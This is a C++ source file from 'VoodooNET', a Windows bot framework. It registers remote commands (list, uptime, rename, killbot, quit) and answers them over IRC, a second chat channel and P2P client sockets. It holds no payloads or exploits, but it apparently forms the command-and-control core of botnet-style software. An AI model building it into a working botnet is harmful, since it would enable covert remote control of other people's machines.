/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include "includes.h"
cCommands::cCommands()
{
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cCommands", "[Initializing]");
#endif
}

void cCommands::Init()
{
	ADDCMD(m_cmdList,		"commands.list",	"list commands",										this);
	ADDCMD(m_cmdTest,		"commands.test",	"test my command for death to all those who oppose",	this);
	ADDCMD(m_cmdNew,		"commands.new",		"more new testing",										this);
	ADDCMD(m_cmdUptime,		"bot.uptime",		"Shows uptime of PC",									this);
	ADDCMD(m_cmdNickGen,	"bot.rename",		"Changes bot name",								this);
	ADDCMD(m_cmdAbout,		"bot.about",		"Shows the creator of this code",						this);
	ADDCMD(m_cmdKillBot,	"bot.killbot",		"Exits Bot Process",									this);
	ADDCMD(m_cmdTestOne,	"bot.testone",		"Test One Thread",										this);
	ADDCMD(m_cmdQuit,		"bot.quit",			"Quit and Reconnect",								this);
	ADDCMD(m_cmdModulesList, "modules.list", "Shows bot modules loaded", this);

	
	ADDMODULE(m_ModListing, "cCommands", "0.1", "cCommands Module");


}
void cCommands::RegisterCommand(command* pCommand, const char* szName, const char* szDesc, cCommandHandler* cHandle)
{

	pCommand->sName.assign(szName);
	pCommand->sDescription.assign(szDesc);
	pCommand->cHandle = cHandle;
	m_lCommands.push_back(pCommand);
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.PrintLine("cCommands:Register", "COMMANDS: %s [%s]", pCommand->sName.c_str(), pCommand->sDescription.c_str());
#endif
}
void cCommands::ShowModules()
{
	list<moduload*>::iterator ic; int iCount = 0;
	printf("test pre-module iteration\r\n");
	for (ic = m_cModules.begin(); ic != m_cModules.end(); ++ic)
	{
		iCount++;
#ifdef _DEBUG

			g_cVoodoo->m_cLogging.PrintLine("cCore", "MODULE: %s (%s) %s", (*ic)->cModule.c_str(), (*ic)->cVersion.c_str(), (*ic)->cDesc.c_str());
#endif
		Sleep(50);

	}
}
void cCommands::RegisterModule(moduload *moo, const char* cModule, const char* cVersion, const char* cDesc, ...)
{
	moo->cModule.assign(cModule);
	moo->cVersion.assign(cVersion);
	moo->cDesc.assign(cDesc);
	m_cModules.push_back(moo);
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.PrintLine("cCore", "MODULE: %s [%s]", moo->cModule.c_str(), moo->cVersion.c_str(), moo->cDesc.c_str());
#endif
}




command* cCommands::FindCommand(const char* szName)
{
	list<command*>::iterator ic; // Cycle through commands and find the string
	cString m_sCmd(szName);
//	g_cVoodoo->m_cIRC.isend(g_cVoodoo->m_cIRC.m_socket, "PRIVMSG %s :TEST %s\r\n", m_sCmd.Token(1, " ").CStr());
	for (ic = m_lCommands.begin(); ic != m_lCommands.end(); ++ic)
		if (!m_sCmd.CompareNoCase((*ic)->sName.c_str())) return (*ic);
	return NULL;
}
bool cCommands::HandleCommand(char* cmd, char* params, ...)
{
	int iCount = 0;
	list<command*>::iterator ic;
	cString	m_sCmd(cmd);
	cString m_sParam(params);
	for (ic = m_lCommands.begin(); ic != m_lCommands.end(); ++ic)
	{
		iCount++;
		if (!m_sCmd.CompareNoCase((*ic)->sName.c_str()))
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.PrintLine("cCommands:Registered", "Registered Command: [Command: %s] [Description: %s]", (*ic)->sName.c_str(), (*ic)->sDescription.c_str());			
			//g_cVoodoo->m_cLogging.Print("cCommands:Registered", "Registered Command: [Command: %s] [Description: %s]", (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_IRC
			g_cVoodoo->m_cIRC.sendmsg("[cCommands]: [Command Reference Number #%d]: [%s] [Description: %s]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cCommands04]: 04[15CommandNum:00 %d04]:00 %s04] [15Description: 00%s04]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_P2P
			for (int i = 1; i < MAX_CLIENTS; i++)
			{
				if (clients[i].socket != NULL)
				{
					g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[cCommands]: [Command Reference Number #%d]: [%s] [Description: %s]\r\n", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());

				}
			}
#endif
			if (!m_sCmd.CompareNoCase("commands.list"))
			{
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("04[15cCommands04]: [00Commands Listing04]");
#endif
				list<command*>::iterator ic; int iCount = 0;
				for (ic = m_lCommands.begin(); ic != m_lCommands.end(); ++ic)
				{
					iCount++;
#ifndef NO_IRC
					g_cVoodoo->m_cIRC.sendmsg("[cCommands]: [Command list: %d] [command: %s] [desc: %s]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_ASTRO
					g_cVoodoo->m_cAstro.sendmsg("04[15cCommands04]: [15Command list:00 %d04] [15command:00 %s04] [15desc:00 %s04]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
					
#ifndef NO_P2P
					for (int i = 1; i < MAX_CLIENTS;i++)
					{
						if (clients[i].socket != NULL)
						{
							g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[cCommands]: [Command list: %d] [command: %s] [desc: %s]\r\n", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
						}
					}
#endif

					Sleep(50);
				}
				return true;
			}

			if (!m_sCmd.CompareNoCase("modules.list"))
			{
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("04[15cCore04]: [00Modules Listing04]");
#endif
				list<moduload*>::iterator ic; int iCount = 0;
				for (ic = m_cModules.begin(); ic != m_cModules.end(); ++ic)
				{
					iCount++;
#ifndef NO_IRC
					g_cVoodoo->m_cIRC.sendmsg("[cCommands]: [Module list: %d] [command: %s] [desc: %s]", iCount, (*ic)->cModule.c_str(), (*ic)->cDesc.c_str());
#endif
#ifndef NO_ASTRO
					g_cVoodoo->m_cAstro.sendmsg("04[15cCore04]: [15Module list:00 %d04] [15Module:00 %s04.00c04] [15Version:00 %s04] [15Desc:00 %s04]", iCount, (*ic)->cModule.c_str(), (*ic)->cVersion.c_str(), (*ic)->cDesc.c_str());
#endif

#ifndef NO_P2P
					for (int i = 1; i < MAX_CLIENTS; i++)
					{
						if (clients[i].socket != NULL)
						{
							g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[cCore]: [Module(%d): %s] [Version: %s] [Description: %s]\r\n", iCount, (*ic)->cModule.c_str(), (*ic)->cVersion.c_str(), (*ic)->cDesc.c_str());
						}
					}
#endif
#ifdef _DEBUG
					g_cVoodoo->m_cLogging.PrintLine("cCore", "Module(%d): %s.c [%s] (%s)", iCount, (*ic)->cModule.c_str(), (*ic)->cVersion.c_str(), (*ic)->cDesc.c_str());
#endif
					Sleep(50);
				}
				return true;
			}
			if (!m_sCmd.CompareNoCase("bot.killbot"))
			{
				g_cVoodoo->m_cLogging.Print("Bot:Main", "Bot Exiting");
				ExitProcess(0);
			}
			if (!m_sCmd.CompareNoCase("bot.uptime"))
			{
				DWORD dwD, dwH, dwM, dwS;
				DWORD tick = (DWORD)GetTickCount64();
				tick /= 1000;
				dwD = tick / 86400;
				dwH = (tick / 3600) - (dwD * 24);
				dwM = (tick % 3600) / 60;	
				dwS = (tick % 3600) % 60;
#ifndef NO_IRC
				g_cVoodoo->m_cIRC.sendmsg("[uptime]: %d Days %d Hours %d Minutes %d Seconds\r\n", dwD, dwH, dwM, dwS);
#endif
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("04[15uptime04]:00 %d Days %d Hours %d Minutes %d Seconds\r\n", dwD, dwH, dwM, dwS);
#endif
#ifndef NO_P2P
				for (int i = 1; i < MAX_CLIENTS; i++)
				{
					if (clients[i].socket != NULL)
					{
						g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[uptime]: %d Days %d Hours %d Minutes %d Seconds\r\n", dwD, dwH, dwM, dwS);
					}
				}
#endif
				return true;
			}
			if (!m_sCmd.CompareNoCase("bot.rename"))
			{
#ifndef NO_IRC
				g_cVoodoo->m_cIRC.sendmsg("Changing name");
				g_cVoodoo->m_cIRC.isend(g_cVoodoo->m_cIRC.m_socket, "NICK %s\r", g_cVoodoo->m_cIRC.NickCreate());
#endif
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("Changing name");
				g_cVoodoo->m_cAstro.SendRaw("NICK %s\r", g_cVoodoo->m_cServer.CreateName());
#endif
			}
			if (!m_sCmd.CompareNoCase("bot.about"))
			{
#ifndef NO_IRC
				g_cVoodoo->m_cIRC.sendmsg("[Voodoo Bot ver.[%d] created by vorteckz]", VERSION);
#endif

#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("04[15Voodoo Bot ver.04[00%d04]00 created by 15vorteckz04]", VERSION);
#endif
#ifndef NO_P2P
				for (int i = 0; i < MAX_CLIENTS; i++)
				{
					if (clients[i].socket != NULL)
					{
						g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[Voodoo Bot ver.[%d] created by vorteckz]\r\n", VERSION);
					}
				}
#endif
				return true;
			}
			if (!m_sCmd.CompareNoCase("bot.testone"))
			{
				DWORD id;
				NTHREAD testone;

				char str_testone_thread[] = "testone";

				testone.threadnum = g_cVoodoo->m_cThread.AddThread(TESTONE_THREAD, str_testone_thread, "TestOneThread");
				if (threads[testone.threadnum].tHandle = CreateThread(NULL, 0, &TestOneThread, (LPVOID)&testone, 0, &id))
				{
#ifdef _DEBUG
					g_cVoodoo->m_cLogging.Print("cThread", "Test One Thread");
#endif

					for (int i = 1; i <= MAX_CLIENTS; i++)
					{
						if (clients[i].socket != NULL)
						{
							g_cVoodoo->m_cServer.RawSend(clients[i].socket, "[cLog:cThread] [Test One Thread]\r\n");
						}
					}
				}
			}
			if (!m_sCmd.CompareNoCase("bot.quit"))
			{
#ifndef NO_IRC
				g_cVoodoo->m_cIRC.sendmsg("Quitting and Reconnect");
#endif
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("Quitting and Reconnect");
#endif
#ifndef NO_P2P
				for (int i = 1; i <= MAX_CLIENTS; i++)
				{
					if (clients[i].socket != NULL)
					{
						g_cVoodoo->m_cServer.RawSend(clients[i].socket, "Quitting and Reconnect");
					}
				}
#endif

#ifdef _DEBUG
				g_cVoodoo->m_cLogging.Print("cIRC:Quit", "Quitting and Reconnecting Freshly");
#endif
#ifndef NO_IRC
				g_cVoodoo->m_cIRC.isend(g_cVoodoo->m_cIRC.m_socket, "QUIT\r\n");
				g_cVoodoo->m_cIRC.Quit();
				g_cVoodoo->m_cIRC.bConnected = false;
#endif
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.SendRaw("QUIT\r\n");
//				g_cVoodoo->m_cAstro.Quit();
				g_cVoodoo->m_cAstro.m_cSocket.Disconnect();
				Sleep(15000);
				g_cVoodoo->m_cAstro.m_bConnected = false;
#endif
			}
		}
	}
	return false;
}
